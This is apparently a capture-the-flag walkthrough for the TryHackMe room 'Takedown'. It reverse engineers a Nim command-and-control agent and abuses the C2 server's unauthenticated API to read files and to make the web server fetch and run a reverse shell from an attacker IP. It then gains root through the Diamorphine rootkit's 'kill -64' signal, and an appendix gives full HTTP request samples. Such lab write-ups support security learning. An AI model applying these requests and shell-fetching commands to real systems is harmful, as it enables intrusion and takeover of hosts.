# Takedown

https://tryhackme.com/room/takedown

Rated "INSANE"

This room has several parts: 

- finding a c2 agent binary on the webserver
- reverse engineering the binary to work out how to communicate with the c2
- asking the c2 to run commands on the webserver, getting a reverse shell
- leveraging a local kernel exploit to get root.

The reverse engineering is probably the longest bit, as its a nim binary and comes out as a bit of a mess in ghidra, but its not too bad.

1. The server exposes ports 22 and 80. On 80 is an 'infinity' website, just basic brochureware. Under /images is a file called shutterbug.jpg.bak which when downloaded is revealed to be a ELF64 binary. Additionally, the favicon.ico on the site is a windows binary - these are the same binary compiled for different architectures.
2. Opening whichever binary in Ghidra, it can be seen they are Nim binaries with the main function being NimMainModule.

Reverse engineering is a slow process - work out what something does, renaming variables and globals as you go to keep track. In brief the binary follows these steps:

- checks command line options: there are just two, -h and -v. -v enables verbose mode which will print out info messages
- checks the current username by running 'whoami'. If it is not the hardcoded value 'c.oberst', the process exits
- registers with the c2 server using a randomly generated UID and the current hostname.
- polls the c2 server's command endpoint for commands to run

The commands it runs are upload (download a file from the c2 server to a local directory), download (upload a file to the c2 server), id, pwd, whoami, hostname, and exec which runs a command on the client server.

The command polling, running upload and download etc all involve calling the c2 server - the request must use a specific user agent, and use a registered 'agent' uid, but otherwise there is no auth or encryption. Since these calls can be made just over HTTP, the binary (and the keyed username c.oberst) are not required. HTTP request samples are below in an appendix.

Using the 'upload' call, its possible to read arbitrary local files on the c2 server. Using this and reading /proc/N/cmdline, (N being a number from 0 to whatever) its possible to find the commandline used to run the c2 server, which reveals the python file. This can then be read to get the full source code of the API and work out what can be done.

From this, the agent UID of the running agent on the webserver can be found. It can also be discovered that posting to /api/agents/webserver-uid/command allows specifying a command the agent should run next. This can be used to compel the webserver to download a reverse shell binary and then run it, which will get you a shell on the webserver and the user flag.

The final step to get root is a little tricky - the machine is hardened so nothing obvious will stand out. The intended path (its possible subsequent linux exploit bugs will also work) involves discovering that /dev/shm, a directory that is usually empty, in fact contains the cloned source code of the [diamor](https://github.com/m0nad/Diamorphine) kernel rootkit, implying this is installed. THis makes root privesc easy: simply send the 64 signal to any process, e.g. by finding a random process id and then executing `kill -64 pid`. This will instantly make the current user (webadmin-lowpriv) a root user, and you can get the final flag.

## Example Web Requests to the C2 Server.

The key to all of these is the 'keyed' user agent, which must be present or the request will be rejected.

Registering a new agent:

```
POST /api/agents/register HTTP/1.1
Host: takedown.thm.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
Connection: close
Content-Type: application/json
Content-Length: 43

{"uid":"fakeuid","hostname":"fakehost"}
```

Reading commands to invoke from the c2 (not necessary for walkthrough):

```
GET /api/agents/fakeuid/command HTTP/1.1
Host: takedown.thm.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
Connection: close
```

Reading arbitrary files on the c2:

```
POST /api/agents/fakeuid/upload HTTP/1.1
Host: takedown.thm.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
Connection: close
Content-Type: application/json
Content-Length: 22

{"file":"bar.txt"}

```

Writing arbitrary files on the c2 (not necessary for walkthrough):

```
POST /api/agents/fakeuid/download HTTP/1.1
Host: takedown.thm.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
Connection: close
Content-Type: application/json
Content-Length: 45

{"file":"test.txt",
"data":"test"
}
```

asking the webserver agent to download a revshell:

```
POST /api/agents/bmir-lkoz-mxkk-apfq/exec HTTP/1.1
Host: takedown.thm.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
Connection: close
Content-Type: application/json
Content-Length: 48

{"cmd":"exec wget 10.10.18.252:1234/client"}


```

exec is one of the c2 commands that invokes a system shell execute. the result is not returned. invoking the revshell above was done with `exec chmod +x client && ./client`.
